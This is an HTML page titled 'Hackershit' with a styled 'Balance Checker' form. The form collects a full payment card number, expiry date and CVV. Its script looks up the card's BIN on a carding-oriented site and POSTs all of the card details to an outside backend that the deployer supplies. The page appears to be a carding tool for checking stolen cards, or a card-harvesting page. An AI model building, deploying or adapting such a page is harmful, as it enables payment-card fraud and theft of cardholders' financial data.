<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Hackershit</title>

    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

    <style>

        body {

            margin: 0;

            padding: 0;

            font-family: 'Orbitron', sans-serif;

            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 50%, #000d1a 100%);

            color: #00ff88;

            overflow-x: hidden;

            animation: galaxySwirl 20s infinite linear;

        }

        @keyframes galaxySwirl {

            0% { background-position: 0% 0%; }

            50% { background-position: 100% 100%; }

            100% { background-position: 0% 0%; }

        }

        body::before {

            content: '';

            position: fixed;

            top: 0;

            left: 0;

            width: 100%;

            height: 100%;

            background-image: radial-gradient(circle at 20% 80%, #00ff88 1px, transparent 1px),

                             radial-gradient(circle at 80% 20%, #8a2be2 1px, transparent 1px),

                             radial-gradient(circle at 40% 40%, #00ff88 1px, transparent 1px);

            background-size: 100px 100px;

            animation: twinkle 4s infinite alternate;

            z-index: -1;

        }

        @keyframes twinkle {

            0% { opacity: 0.5; }

            100% { opacity: 1; }

        }

        h1 {

            text-align: center;

            font-size: 3em;

            color: #8a2be2;

            text-shadow: 0 0 20px #00ff88, 0 0 40px #8a2be2;

            margin-top: 50px;

            animation: glow 2s infinite alternate;

        }

        @keyframes glow {

            from { text-shadow: 0 0 20px #00ff88; }

            to { text-shadow: 0 0 30px #8a2be2; }

        }

        form {

            max-width: 400px;

            margin: 50px auto;

            background: linear-gradient(45deg, #2e0033, #001a1a);

            padding: 30px;

            border-radius: 15px;

            box-shadow: 0 0 30px #00ff88, inset 0 0 30px rgba(138, 43, 226, 0.5);

            border: 2px solid #8a2be2;

        }

        input[type="text"] {

            width: 100%;

            padding: 10px;

            margin: 10px 0;

            border: 1px solid #00ff88;

            border-radius: 5px;

            background: #000;

            color: #00ff88;

            font-family: 'Orbitron', sans-serif;

            box-shadow: 0 0 10px #8a2be2;

        }

        input[type="text"]:focus {

            outline: none;

            box-shadow: 0 0 20px #00ff88;

        }

        input[type="submit"] {

            width: 100%;

            padding: 15px;

            background: linear-gradient(45deg, #00ff88, #8a2be2);

            border: none;

            border-radius: 5px;

            color: #000;

            font-size: 1.2em;

            font-family: 'Orbitron', sans-serif;

            cursor: pointer;

            box-shadow: 0 0 20px #00ff88;

            transition: all 0.3s ease;

        }

        input[type="submit"]:hover {

            box-shadow: 0 0 40px #8a2be2;

            transform: scale(1.05);

        }

        #result {

            max-width: 400px;

            margin: 20px auto;

            padding: 20px;

            background: rgba(0, 0, 0, 0.8);

            border-radius: 10px;

            text-align: center;

            font-size: 1.2em;

            color: #00ff88;

            box-shadow: 0 0 20px #8a2be2;

            animation: pulse 2s infinite;

        }

        @keyframes pulse {

            0% { opacity: 1; }

            50% { opacity: 0.7; }

            100% { opacity: 1; }

        }

    </style>

</head>

<body>

    <h1>Balance Checker</h1>

    <form id="balanceForm">

        Card Number: <input type="text" name="card_number" required><br>

        Exp (MM/YY): <input type="text" name="exp" required><br>

        CVV: <input type="text" name="cvv" required><br>

        <input type="submit" value="Check Balance">

    </form>

    <div id="result"></div>

    <script>

        document.getElementById('balanceForm').addEventListener('submit', async function(e) {

            e.preventDefault();

            const formData = new FormData(this);

            const cardNumber = formData.get('card_number').replace(/\s/g, '');

            const exp = formData.get('exp');

            const cvv = formData.get('cvv');



            if (!/^\d{16}$/.test(cardNumber)) {

                document.getElementById('result').innerText = 'Error: Invalid card number (must be 16 digits)';

                return;

            }

            if (!/^\d{2}\/\d{2}$/.test(exp)) {

                document.getElementById('result').innerText = 'Error: Invalid exp format (MM/YY)';

                return;

            }

            if (!/^\d{3,4}$/.test(cvv)) {

                document.getElementById('result').innerText = 'Error: Invalid CVV';

                return;

            }



            document.getElementById('result').innerText = 'Checking balance... (This may take a few seconds)';



            const bin = cardNumber.substring(0, 6);

            let binInfo = 'Unknown BIN';

            try {

                const binResponse = await fetch(`https://binx.cc/bin/${bin}`);

                if (binResponse.ok) {

                    const binData = await binResponse.text();

                    binInfo = `BIN ${bin}: ${binData.match(/<title>(.*?)<\/title>/)?.[1] || 'Details on BinX'}`;

                }

            } catch (err) {

                binInfo = `BIN ${bin}: Fetch failed`;

            }



            const response = await fetch('hackershit-production.up.railway.app', {  // Replace with your Railway URL

                method: 'POST',

                headers: { 'Content-Type': 'application/json' },

                body: JSON.stringify({

                    card_number: cardNumber,

                    exp: exp,

                    cvv: cvv

                })

            });



            const data = await response.json();

            document.getElementById('result').innerHTML = `

                ${binInfo}<br>

                <a href="https://binx.cc/bin/${bin}" target="_blank" style="color: #00ff88;">Check BIN on BinX</a><br>

                Balance: ${data.balance}

            `;

        });

    </script>

</body>

</html>
